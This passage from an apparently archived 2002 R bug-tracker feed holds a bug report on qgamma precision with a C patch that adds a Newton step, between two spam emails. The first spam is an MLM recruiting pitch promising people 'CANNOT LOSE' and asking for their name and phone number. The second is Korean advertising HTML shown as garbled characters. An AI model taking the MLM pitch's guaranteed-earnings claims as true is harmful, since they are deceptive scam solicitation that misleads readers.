the top!  Let's Make some BIG Money in the Music Biz!
What is there to think about?

There is a REAL person behind this e-mail that has "been
there & done that" over the years with many other companies
including my own.  The timing is Perfect for this Business...
We will break all records in the history of MLM, without a
doubt!  

You don't have to know anything about MLM or how to 
work this business.  My team is the Fastest growing group 
in the Company and we will help you every step of the way.
My team members & I will coach you via Team Conference Calls,
e-mails, Newsletters, Personal phone calls, Etc.
You CANNOT LOSE!  This is for real!

Ready for MORE INFO?

Please send your NAME, PHONE # and best time to reach you
(include TIME ZONE) to the email address below:
NOTE: (No info will be sent without a valid phone #)

mailto:success903@hotmail.com

-------------------------------------------------------------------------------------------------------
-------------------------------------------------------------------------------------------------------
To Unsubscribe:
Send a BLANK email to the address below
mailto:protect580@hotmail.com



7053IaPI9-465ZylJ7008XZCm2-527sOUl31
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 2214 *
Subject: qgamma precision
From: terra@diku.dk
Date: Fri, 25 Oct 2002 16:50:17 +0200 (MET DST)
-- no notes --
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 2214 <==
From terra@diku.dk  Fri Oct 25 16:50:17 2002
Received: from blueberry (blueberry [192.38.19.4])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id QAA13654
	for <R-bugs@biostat.ku.dk>; Fri, 25 Oct 2002 16:50:17 +0200 (MET DST)
Date: Fri, 25 Oct 2002 16:50:17 +0200 (MET DST)
From: terra@diku.dk
Message-Id: <200210251450.QAA13654@pubhealth.ku.dk>
To: R-bugs@biostat.ku.dk
Subject: qgamma precision

Full_Name: Morten Welinder
Version: 1.5.1
OS: Solaris
Submission from: (NULL) (65.213.85.136)


I was having problems with qgamma's precision in the sense that
pgamma(qpgamma(x))
was not as close to the identity function as I would like.  I was seeing
relative
errors with random input of about 1e-8.  This fits nicely with the code'd EPS2
value of 5e-7.

To solve this I added a newton step at the end.  This seems far cheaper than
the
current iterations.  Here's the code I added (to replace the final return):


    /* Special Gnumeric patch to improve precision.  */
    {
	gnum_float x0 = 0.5*scale*ch;
	gnum_float e0 = pgamma (x0, alpha, scale, lower_tail, log_p) - p;

	if (e0 != 0 && lower_tail && !log_p) {
	    gnum_float d0 = dgamma (x0, alpha, scale, log_p);
	    if (d0) {
		gnum_float x1 = x0 - e0 / d0;
		gnum_float e1 = pgamma (x1, alpha, scale, lower_tail, log_p) - p;
		if (gnumabs (e1) < gnumabs (e0))
		    x0 = x1;
	    }
	}

	return x0;
    }

(Just read "gnum_float" as "double" and "gnumabs" as "fabs".)

The test for lower_tail is because (a) that is where I use it, and (b) the d0
calculation is probably wrong otherwise.

With this change, the relative precision improves to something like 1e-15.

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 2215 *
Subject: (±¤°í)²À! ÇÊ¿äÇÑ »ç¶÷¿¡°Ô¸¸ ¹ÌÄ£¿µ¾î»ùÇÃ µå¸³´Ï´Ù.
From: ¹è¼Û´ã´çÀÚ <ohmyenglish@korea.com>
Date: Sat, 26 Oct 2002 01:58:22 +0900
-- no notes --
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 2215 <==
From ohmyenglish@korea.com  Fri Oct 25 19:02:14 2002
Received: from hypatia.math.ethz.ch (root@hypatia.ethz.ch [129.132.58.23])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id TAA14199
	for <R-bugs@biostat.ku.dk>; Fri, 25 Oct 2002 19:02:14 +0200 (MET DST)
Received: from korea.com (s210-221-113-249.thrunet.ne.kr [210.221.113.249])
	by hypatia.math.ethz.ch (8.12.6/8.12.6) with SMTP id g9PH1RxB023896
	for <r-bugs@lists.r-project.org>; Fri, 25 Oct 2002 19:01:30 +0200 (MEST)
Message-Id: <200210251701.g9PH1RxB023896@hypatia.math.ethz.ch>
Reply-To: ohmyenglish@korea.com
From: ¹è¼Û´ã´çÀÚ <ohmyenglish@korea.com>
To: <r-bugs@stat.math.ethz.ch>
Subject: (±¤°í)²À! ÇÊ¿äÇÑ »ç¶÷¿¡°Ô¸¸ ¹ÌÄ£¿µ¾î»ùÇÃ µå¸³´Ï´Ù.
Sender: ¹è¼Û´ã´çÀÚ <ohmyenglish@korea.com>
Mime-Version: 1.0
Content-Type: text/html; charset="ks_c_5601-1987"
Date: Sat, 26 Oct 2002 01:58:22 +0900
Content-Transfer-Encoding: 8bit

<HTML>
<HEAD>
<META content="text/html; charset=ks_c_5601-1987" http-equiv=Content-Type>
<STYLE> p, font, span { line-height:120%; margin-top:0; margin-bottom:0; }</STYLE>
</HEAD><BODY>
<P>&nbsp;</P>
  <P>&nbsp;</P>
  
<table width="603" border="1" bordercolor="#000000" height=" ">
  <tr valign="top" bgcolor="#ffffff" bordercolor="#ccccff"> 
    <td colspan="2" height="518"> 
      <p align="center"><img src="http://www.8205.com/main/1025.gif" width="200" height="200"><img src="http://www.8205.com/main/1025.gif" width="200" height="200"><img src="http://www.8205.com/main/1025.gif" width="200" height="200"></p>
      <blockquote>
        <p>Å©·¹ÀÌÁöÀ×±Û¸®½¬(¹ÌÄ£¿µ¾î)¸¦ ¼Ò°³ÇØµå¸®·Á°í ÇÕ´Ï´Ù.</p>
        <p>¹æ¹ýÀº ÀúÈñ°¡ ¹«·á»ùÇÃ°ú °ü·ÃÀÚ·á¸¦ ¿ìÆíÀ¸·Î ¹«·á¹ß¼ÛÇØµå¸®°í ³»¿ëÀ» ¾È³»ÇØµå¸®´Â ¹æ½ÄÀÔ´Ï´Ù.</p>
        <p> </p>
        <p>¸¹ÀººÐµéÀÌ ÀÌ¹Ì Å©·¹ÀÌÁöÀ×±Û¸®½¬¸¦ ¾Ë°í °è½ÃÁö¸¸ Á¤¸» È¿°ú°¡ ÀÖ´ÂÁö, ÇÐ½À¹æ¹ýÀº ¾î¶²Áö ÀÚ¼¼È÷ ¾Ë°í °è½ÃÁö´Â ¾ÊÀ¸½Ç°ÍÀÔ´Ï´Ù.</p>
        <p>&nbsp;</p>
        <p><font color="#0000ff">±×µ¿¾È °è¼ÓÇØ¼­ ÇÐ¿ø, ±³Àç, µîµî ¿©·¯¹æ½ÄÀ¸·Î ¿µ¾î°øºÎ¸¦ ½ÃÀÛÇÏ¼ÌÁö¸¸ ½ÇÆÐÇÏ½ÅºÐµéÀº 
          ¸¶Áö¸·ÀÌ¶ó »ý°¢ÇÏ½Ã°í »ùÇÃÀ» ¹Þ¾Æº¸½Ê½Ã¿ä. ÀúÈñ°¡ ÁÖÀåÇÏ°Çµ¥ Å©·¹ÀÌÁö·Î ¾ÈµÇ¸é ¿µ¾î´Â Æ÷±âÇÏ¼Å¾ß ÇÕ´Ï´Ù.</font></p>
        <p>&nbsp;</p>
        <p>¹«·á»ùÇÃÀÌÁö¸¸ ´ÙÀ½°ú °°Àº °æ¿ì¿¡´Â ½ÅÃ»À» »ç¾çÇÕ´Ï´Ù.</p>
        <p>1. ±×³É È£±â½É¿¡ Àå³­À¸·Î ½ÅÃ»ÇÏ½Ã´Â ºÐ.</p>
        <p>2. °øºÎÇÏ°íÀÚ ÇÏ´Â »ý°¢Àº ÀüÇô ¾ø°í ¹«·á´Ï±î ±×³É ½ÅÃ»ÇÏ½Ã´Â ºÐ.</p>
        <p>3. »ùÇÃ ¼öÁýÀÌ Ãë¹ÌÀÌ½ÅºÐ.</p>
        <p>&nbsp;</p>
        <p>»ùÇÃÀ» º¸³»µå¸®¸é¼­ Á¶°ÇÀ» °®´Â°ÍÀº ÁË¼ÛÇÕ´Ï´Ù¸¸, ¸¹ÀººÐµéÀÌ </p>
        <p>Àå³­À¸·Î ½ÅÃ»ÇÏ¼Å¼­ ¼­·Î°¡ ½Ã°£Àû, °æÁ¦Àû ³¶ºñ¸¦ ÇÏ°ÔµÇ´Â °æ¿ì°¡ ÀÖ½À´Ï´Ù.</p>
        <p>&nbsp;</p>
        <p><font color="#0000ff">´ë½Å, ¿µ¾î°¡ Àý½ÇÈ÷ ÇÊ¿äÇÏ½Å °í°´ºÐµé¿¡°Ô´Â ÃÖ¼±ÀÇ Ä£ÀýÇÑ »ó´ã°ú</font></p>
        <p><font color="#0000ff">Á¤È®ÇÑ »ùÇÃ¹ß¼ÛÀ» ¾à¼Óµå¸®°Ú½À´Ï´Ù. °¨»çÇÕ´Ï´Ù.</font></p>
        <p>&nbsp;</p>
        <p> </p>
        </blockquote>
      <p align="right"><a href="http://www.crazyok.com/form.htm">»ùÇÃ½ÅÃ»À» ÇÏ½Ã·Á¸é ¿©±â¸¦ 
        Å¬¸¯ &gt;&gt;&gt;&gt; »ùÇÃ ½ÅÃ»</a> </p>
    </td>
    </tr>
    
  <tr bgcolor="#cccccc" bordercolor="#ffff99"> 
    <td height="148" colspan="2"> 
      <blockquote>
        <p>&nbsp;</p>
        <p><font size="2" color="#0000ff">ÇÊ¿ä¾ø´Â Á¤º¸¸é ÇÏ´ÜÀÇ ¼ö½Å°ÅºÎ¸¦ ´©¸£¼¼¿ä. Â÷ÈÄ ¸ÞÀÏÀ» ¹ÞÁö ¾Ê½À´Ï´Ù.<br>
          (If you don't want this type of information or e-mail, please click 
          the 'refuse button) </font></p>
        <p>&nbsp;</p>
        <p><font color="#ff0066" size="2"><A href="mailto:stop114@korea.com?subject=%20%C0%FD%B4%EB%20%BC%F6%BD%C5%B0%C5%BA%CE">¢º 
          ¼ö ½Å °Å ºÎ </a><font color="#000000">(stop114@korea.com) </font></font><font size="2"><A href="mailto:stop114@korea.com?subject=%20refuse">¢º 
          refuse button</a></font></p>
        <p>&nbsp;</p>
        <p><font size="2" color="#0000ff">º»¸ÞÀÏÀº °ü·Ã¹ýÀ» ÁØ¼öÇÏ¿© (±¤°í)¶ó°í Ç¥½ÃÇÏ¿´À¸¸ç ¼ö½Å°ÅºÎÀåÄ¡¸¦ 
          ¸¶·ÃÇÏ°í ÀÖ½À´Ï´Ù.</font></p>
        <p><font size="2" color="#0000ff"> ±ÍÇÏÀÇ ¸ÞÀÏÁÖ¼Ò´Â ÀÎÅÍ³Ý»ó¿¡ ÃëµæÇÏ¿´À¸¸ç ÀÌ¿ÜÀÇ °³ÀÎÁ¤º¸´Â °®°íÀÖÁö 
          ¾Ê½À´Ï´Ù.</font></p>
        <p>&nbsp;</p>
        <p><font size="2" color="#0000ff">¹ß½Å : ÀÎÅÍ³Ý ±³À°,ÃâÆÇ ¸ÞÀÏ¸¶ÄÏÆÃ Àü¹® ±â¾÷ ¿¥ÇÇ³Ý¿¡¼­ ÀüÇØµå¸®´Â 
          Á¤º¸ÀÔ´Ï´Ù. </font></p>
        <p><font size="2" color="#0000ff"> www.mp3english.net&lt;02-775-8292 ¿¥ÇÇ³Ý 
          ¹«·á»ùÇÃ´ã´çÀÚ&gt; </font></p>
        </blockquote>
      <STYLE type=text/css>A:link {color:#0033CC;text-decoration:none;font-size:9pt}A:hover {color:#FF3300;text-decoration:none;font-size:9pt} TD { font-size:9pt;}title{font-size:12pt;}</STYLE>
      <BR>
 
  <TR>
    <TD vAlign=top><FONT 
      size=1>.....................................................................................................................................................................................................</FONT></TD></TR></table>
</BODY>
</HTML>
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
